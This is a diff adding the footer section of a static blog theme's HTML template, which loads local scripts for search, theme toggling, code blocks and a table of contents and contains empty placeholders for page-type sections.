+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+
+</body>
+</html>
